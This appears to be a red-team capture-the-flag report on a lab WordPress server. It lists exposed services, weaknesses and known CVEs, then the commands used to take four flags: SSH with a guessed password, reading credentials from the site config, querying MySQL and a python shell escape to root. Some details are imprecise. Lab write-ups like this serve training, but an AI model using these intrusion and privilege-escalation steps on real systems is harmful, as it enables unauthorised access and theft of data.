This scan identifies the services below as potential points of entry:

Target 1
Port 22 (SSH)
Port 80 (HTTP)
Port 111 (rpcbind)
Port 139 (netbios / smb)
Port 445 (netbios / smb)
Critical Vulnerabilities
The following vulnerabilities were identified on each target:

Target 1
wpscan user enumeration
wpscan was able to enumerate users and find valid usernames for the target system.
wp-scan-output
SSH with Password
Users are able to ssh into the machine with simply a password, rather than requiring an SSH key.
User michael had an incredibly weak password (same as his username).
python can run with sudo
User steven has the ability to run python with sudo
Python can execute arbitrary code on the system, so it is trivial to get a shell with root access using this loophole
Database credentials in plain text
Database credentials for the wordpress site were found written in plain text, and stored in the /var/www/html/wp_config.php.
This allowed us to access the mysql database used for the site, and extract password hashes and other confidential information.
CVE-2017-3167
Authentication bypass is possible on the version of Apache running on the server
CVE-2017-7494
Version of samba running on the server is insecure and allows for remote code execution.
Exploitation
The Red Team was able to penetrate Target 1 and retrieve the following confidential data:

Target 1
flag1.txt: b9bbcb33e11b80be759c4e844862482d
Exploit Used
Weak Password / SSH with password
After SSHing into the host with michael's credentials, we were able to search the /var/www/html directory for flag1.
Commands run:
ssh michael@192.168.1.100
cd /var/www/html
grep -ER flag1
flag2.txt: fc3fd58dcdad9ab23faca6e9a36e581c
Exploit Used
Weak Password / SSH with password
After SSHing into the host with michael's credentials, flag2 was found right in /var/www
Commands run:
ssh michael@192.168.1.100
cd /var/www
cat flag2.txt
flag3.txt: afc01ab56b50591e7dccf93122770cd2
Exploit Used
Database credentials in plain text
After getting the database credentials from /var/www/html/wp_config.php, we connected to the mysql database and searched for the flag.
Commands run:
ssh michael@192.168.1.100
less /var/www/html/wp_config.php
mysql --user root --password # Password is R@v3nSecurity
mysql> SELECT post_title, post_content FROM wp_posts WHERE post_title LIKE "flag%";
This returned the value for flag 3
flag4.txt: 715dea6c055b9fe3337544932f2941ce
Exploit Used
python can run with sudo
After cracking steven's password using john and the hash found in the database, we determined that user steven could run python with sudo permissions.
This allows us to use python as sudo to execute a shell program, thereby granting us access to the root account.
flag4.txt was found in the /root directory, the root account's home directory.
Commands run:
python -c 'import os; os.system("/bin/sh")'
cat flag4.txt
